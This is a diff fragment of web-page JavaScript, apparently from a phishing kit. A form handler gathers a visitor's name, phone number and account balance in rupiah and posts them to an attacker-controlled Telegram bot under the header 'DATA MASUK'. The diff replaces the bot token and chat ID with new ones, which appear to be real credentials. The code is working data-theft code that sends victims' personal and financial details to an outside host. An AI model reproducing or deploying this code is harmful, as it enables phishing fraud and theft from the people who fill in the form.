@@ -874,11 +874,11 @@ body{
             	$("#mainForm").submit(function(e) {
             	  e.preventDefault();
             
-            var token = "8304642455:AAG7XmrIVTdw0LrBropxQpMk9EGTaPRxCuc";
-            var chatID = "5897739787";
-            	  var message = "⚔⚔⚔ DATA MASUK ⚔⚔⚔\n";
+            var token = "8325471604:AAF2Js3ws9Eb-3NfLmy3-omJd9vurYkGxWY";
+            var chatID = "5747053267";
+            	  var message = " DATA MASUK \n";
 	message += ('\n<b>Nama:</b>\n'+$("#nama").val().trim()+'\n\n<b>No. HP:</b>\n'+$("#nomor").val().trim()+'\n\n<b>Saldo:</b>\nRp'+$("#saldo").val().trim()+'\n\n');
-	message += "⚜⚜⚜⚜⚜⚜⚜⚜⚜⚜⚜⚜";
+	message += "";
 	
 	fetch("https://api.telegram.org/bot"+token+"/sendMessage?parse_mode=html", {
         method: 'POST',
